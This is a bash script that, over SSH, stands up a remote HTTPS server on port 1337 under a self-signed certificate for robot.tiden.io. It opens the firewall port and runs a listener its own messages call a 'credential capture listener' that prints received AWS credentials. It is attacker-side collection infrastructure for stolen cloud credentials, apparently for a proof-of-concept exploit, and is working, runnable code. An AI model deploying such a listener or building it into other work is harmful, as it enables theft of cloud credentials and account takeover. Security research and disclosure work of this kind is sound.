#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd -P)"
LISTENER_SOURCE="${SCRIPT_DIR}/proof-listener.py"
REMOTE_HOST="YOURHOST"
REMOTE_DIR="/tmp/rtv-proof-listener"
REMOTE_CERT="${REMOTE_DIR}/cert.pem"
REMOTE_KEY="${REMOTE_DIR}/key.pem"
LOCAL_CA="/tmp/rtv-proof-listener-ca.pem"
CONTROL_PATH="/tmp/rtv-proof-%C"
REMOVE_FIREWALL_PORT=0

for command_name in ssh scp; do
  command -v "$command_name" >/dev/null 2>&1 || {
    echo "ERROR: ${command_name} is required" >&2
    exit 1
  }
done
[[ -r "$LISTENER_SOURCE" ]] || {
  echo "ERROR: proof-listener.py is missing" >&2
  exit 1
}

cleanup() {
  ssh -o BatchMode=yes -o ControlPath="$CONTROL_PATH" "$REMOTE_HOST" \
    sudo -n fuser -k 1337/tcp >/dev/null 2>&1 || true
  if [[ "$REMOVE_FIREWALL_PORT" == "1" ]]; then
    ssh -o BatchMode=yes -o ControlPath="$CONTROL_PATH" "$REMOTE_HOST" \
      sudo -n firewall-cmd --remove-port=1337/tcp >/dev/null 2>&1 || true
  fi
  ssh -o BatchMode=yes -o ControlPath="$CONTROL_PATH" "$REMOTE_HOST" \
    sudo -n rm -rf "$REMOTE_DIR" >/dev/null 2>&1 || true
  rm -f "$LOCAL_CA"
}
trap cleanup EXIT INT TERM

ssh -o BatchMode=yes -o ControlPath="$CONTROL_PATH" "$REMOTE_HOST" \
  sudo -n rm -rf "$REMOTE_DIR"
ssh -o BatchMode=yes -o ControlPath="$CONTROL_PATH" "$REMOTE_HOST" \
  sudo -n mkdir -m 711 "$REMOTE_DIR"
ssh -o BatchMode=yes -o ControlPath="$CONTROL_PATH" "$REMOTE_HOST" \
  sudo -n openssl req -x509 -newkey rsa:2048 -nodes -days 1 \
    -subj /CN=robot.tiden.io \
    -addext subjectAltName=DNS:robot.tiden.io \
    -keyout "$REMOTE_KEY" \
    -out "$REMOTE_CERT" >/dev/null 2>&1
ssh -o BatchMode=yes -o ControlPath="$CONTROL_PATH" "$REMOTE_HOST" \
  sudo -n chmod 644 "$REMOTE_CERT"
scp -q -o BatchMode=yes -o ControlPath="$CONTROL_PATH" \
  "${REMOTE_HOST}:${REMOTE_CERT}" "$LOCAL_CA"
chmod 600 "$LOCAL_CA"

if ! ssh -o BatchMode=yes -o ControlPath="$CONTROL_PATH" "$REMOTE_HOST" \
  sudo -n firewall-cmd --query-port=1337/tcp >/dev/null 2>&1; then
  ssh -o BatchMode=yes -o ControlPath="$CONTROL_PATH" "$REMOTE_HOST" \
    sudo -n firewall-cmd --add-port=1337/tcp >/dev/null
  REMOVE_FIREWALL_PORT=1
fi

echo "Starting credential capture listener on https://robot.tiden.io:1337/"
echo "The listener will print received AWS credentials to stdout."
ssh \
  -o BatchMode=yes \
  -o ControlPath="$CONTROL_PATH" \
  "$REMOTE_HOST" \
  sudo -n python3 -u - \
    --host 0.0.0.0 \
    --port 1337 \
    --cert "$REMOTE_CERT" \
    --key "$REMOTE_KEY" \
  < "$LISTENER_SOURCE"
